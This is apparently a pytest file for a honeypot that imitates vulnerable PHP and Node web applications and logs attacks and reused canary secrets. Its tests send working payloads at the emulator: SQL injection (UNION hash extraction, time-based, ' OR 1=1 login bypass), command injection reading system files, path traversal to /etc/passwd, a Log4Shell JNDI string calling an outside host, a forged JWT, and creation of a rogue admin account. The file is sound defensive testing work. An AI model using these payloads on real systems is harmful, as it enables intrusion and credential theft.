"""The attack surface behaves like the real vulnerable application would."""

from __future__ import annotations

import time

from tests.conftest import client


async def test_traps_answer_without_llm(make_trap):
    c = make_trap()
    sec = c.world.data["secrets"]
    async with client(c) as http:
        env = await http.get("/.env")
        assert env.status_code == 200 and f"DB_PASSWORD={sec['db_password']}" in env.text
        robots = await http.get("/robots.txt")
        assert robots.status_code == 200 and "Disallow" in robots.text
        pma = await http.get("/phpmyadmin/")
        assert pma.status_code == 200 and "phpMyAdmin" in pma.text
        git = await http.get("/.git/config")
        assert git.status_code == 200 and "[remote" in git.text


async def test_sqli_error_based_message(make_trap):
    c = make_trap()
    async with client(c) as http:
        r = await http.get("/product.php", params={"id": "1'"})
    assert "You have an error in your SQL syntax" in r.text
    assert "MySQL server version" in r.text


async def test_sqli_union_extracts_world_data(make_trap):
    c = make_trap()
    admin = next(e for e in c.world.data["employees"] if e["id"] == 1)
    async with client(c) as http:
        r = await http.get("/product.php", params={
            "id": "-1 UNION SELECT 1,CONCAT(username,0x3a,password),3,4 FROM users WHERE id=1-- -"})
    assert f"{admin['username']}:{admin['md5']}" in r.text


async def test_sqli_union_wrong_column_count(make_trap):
    c = make_trap()
    async with client(c) as http:
        r = await http.get("/product.php", params={"id": "1 UNION SELECT 1,2"})
    assert "The used SELECT statements have a different number of columns" in r.text


async def test_sqli_version_and_schema(make_trap):
    c = make_trap()
    async with client(c) as http:
        r = await http.get("/product.php", params={"id": "-1 UNION SELECT 1,@@version,database(),4"})
        assert "8.0.35-0ubuntu0.20.04.1" in r.text
        r = await http.get("/product.php", params={
            "id": "-1 UNION SELECT 1,GROUP_CONCAT(table_name),3,4 FROM information_schema.tables "
                  "WHERE table_schema=database()"})
        assert "users" in r.text and "orders" in r.text


async def test_sqli_boolean_based(make_trap):
    c = make_trap()
    async with client(c) as http:
        t = await http.get("/product.php", params={"id": "1 AND 1=1"})
        f = await http.get("/product.php", params={"id": "1 AND 1=2"})
    assert t.text != f.text
    assert c.world.data["products"][0]["name"] in t.text


async def test_sqli_time_based_really_sleeps(make_trap):
    c = make_trap()
    async with client(c) as http:
        t0 = time.perf_counter()
        await http.get("/product.php", params={"id": "1 AND SLEEP(1)"})
        slow = time.perf_counter() - t0
        t0 = time.perf_counter()
        await http.get("/product.php", params={"id": "1"})
        fast = time.perf_counter() - t0
    assert slow >= 0.95
    assert fast < 0.8


async def test_login_bypass_and_admin_area(make_trap):
    c = make_trap()
    async with client(c) as http:
        r = await http.get("/admin/")
        assert r.status_code == 302 and r.headers["location"] == "/login.php"
        bad = await http.post("/login.php", data={"username": "admin", "password": "nope"})
        assert "Invalid username or password" in bad.text
        r = await http.post("/login.php", data={"username": "' OR 1=1-- -", "password": "x"})
        assert r.status_code == 302 and r.headers["location"] == "/admin/"
        r = await http.get("/admin/users.php")
        assert r.status_code == 200
        assert c.world.data["employees"][0]["email"] in r.text


async def test_real_credentials_login(make_trap):
    c = make_trap()
    emp = c.world.data["employees"][3]
    async with client(c) as http:
        r = await http.post("/login.php", data={"username": emp["username"], "password": emp["password"]})
    assert r.status_code == 302


async def test_command_injection_goes_to_the_emulator(make_trap):
    c = make_trap()
    async with client(c) as http:
        await http.post("/login.php", data={"username": "' OR 1=1-- -", "password": "x"})
        r = await http.post("/admin/tools.php", data={"host": "127.0.0.1; id; cat /etc/hostname"})
    assert "uid=33(www-data) gid=33(www-data) groups=33(www-data)" in r.text
    assert c.world.hostname in r.text
    assert "PING 127.0.0.1" in r.text


async def test_lfi_through_download(make_trap):
    c = make_trap()
    async with client(c) as http:
        r = await http.get("/download.php", params={"file": "../../../../etc/passwd"})
        assert "root:x:0:0:root:/root:/bin/bash" in r.text
        r = await http.get("/download.php", params={"file": "../../../../etc/shadow"})
        assert r.text == ""          # www-data cannot read it; display_errors=Off


async def test_attacks_are_classified_in_telemetry(make_trap):
    c = make_trap()
    async with client(c) as http:
        await http.get("/product.php", params={"id": "1 UNION SELECT 1,2,3,4"})
        await http.get("/download.php", params={"file": "../../etc/passwd"})
        await http.get("/", headers={"User-Agent": "${jndi:ldap://203.0.113.4/a}"})
        await http.get("/", headers={"User-Agent": "python-requests/2.31.0"})
    c.telemetry.flush()
    rows = c.db.query("SELECT attack_type, attack_detail FROM events ORDER BY id")
    kinds = [r["attack_type"] for r in rows]
    assert kinds == ["sqli", "lfi", "log4shell", None]


async def test_canary_hit_when_leaked_secret_is_reused(make_trap):
    c = make_trap()
    sec = c.world.data["secrets"]
    async with client(c) as http:
        await http.get("/.env")
        await http.post("/phpmyadmin/index.php", data={"pma_username": sec["db_user"], "pma_password": sec["db_password"]})
    c.telemetry.flush()
    hits = c.db.query("SELECT token, context FROM canary_hits")
    assert any(h["token"] == sec["db_password"] for h in hits)
    creds = c.db.query("SELECT protocol, username, success FROM credentials")
    assert creds == [{"protocol": "phpmyadmin", "username": sec["db_user"], "success": 1}]


# -- node-express-api ------------------------------------------------------------------------

async def test_api_jwt_flow(make_trap):
    c = make_trap("node-express-api")
    admin = next(e for e in c.world.data["employees"] if e["role"] == "admin" and e["active"])
    async with client(c) as http:
        assert (await http.get("/api/v1/users")).json() == {"error": "No token provided"}
        bad = await http.post("/api/v1/auth/login", json={"email": admin["email"], "password": "x"})
        assert bad.status_code == 401
        ok = await http.post("/api/v1/auth/login", json={"email": admin["email"], "password": admin["password"]})
        assert ok.status_code == 200
        token = ok.json()["token"]
        auth = {"Authorization": f"Bearer {token}"}
        users = (await http.get("/api/v1/users", headers=auth)).json()
        assert len(users) == len(c.world.data["employees"])
        forged = token[:-4] + ("AAAA" if not token.endswith("AAAA") else "BBBB")
        r = await http.get("/api/v1/users", headers={"Authorization": f"Bearer {forged}"})
        assert r.json() == {"error": "invalid signature"}
        none_alg = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6MSwicm9sZSI6ImFkbWluIn0."
        r = await http.get("/api/v1/users", headers={"Authorization": f"Bearer {none_alg}"})
        assert r.status_code == 401
        created = await http.post("/api/v1/users", headers=auth,
                                  json={"username": "svc_backup", "email": "b@x.test", "password": "P@ss1", "role": "admin"})
        assert created.status_code == 201
        again = await http.post("/api/v1/auth/login", json={"email": "svc_backup", "password": "P@ss1"})
        assert again.status_code == 200


async def test_api_search_sqli_and_mysql2_errors(make_trap):
    c = make_trap("node-express-api")
    admin = next(e for e in c.world.data["employees"] if e["active"])
    async with client(c) as http:
        tok = (await http.post("/api/v1/auth/login",
                               json={"email": admin["email"], "password": admin["password"]})).json()["token"]
        auth = {"Authorization": f"Bearer {tok}"}
        r = await http.get("/api/v1/users", params={"search": "'"}, headers=auth)
        assert r.status_code == 500 and r.json()["code"] == "ER_PARSE_ERROR" and r.json()["errno"] == 1064
        r = await http.get("/api/v1/users", headers=auth, params={
            "search": "zzz' UNION SELECT 1,password,3,4,5,6,7,8,9 FROM users-- -"})
        assert r.status_code == 200
        assert any(row["username"] == admin["md5"] for row in r.json())


async def test_api_backup_traversal_and_graphql(make_trap):
    c = make_trap("node-express-api")
    async with client(c) as http:
        r = await http.get("/api/v1/backups/download", params={"file": "../../../etc/passwd"})
        assert "root:x:0:0" in r.text
        r = await http.get("/api/v1/backups/download", params={"file": "nope.sql"})
        assert r.status_code == 404 and "ENOENT" in r.json()["error"]
        r = await http.post("/graphql", json={"query": "{ __schema { types { name } } }"})
        assert r.json()["data"]["__schema"]["queryType"]["name"] == "Query"
        r = await http.post("/graphql", json={"query": "{ users(limit: 2) { id username email } }"})
        assert len(r.json()["data"]["users"]) == 2
        r = await http.post("/graphql", json={"query": "{ users { password } }"})
        assert r.status_code == 400 and 'Cannot query field "password"' in r.json()["errors"][0]["message"]
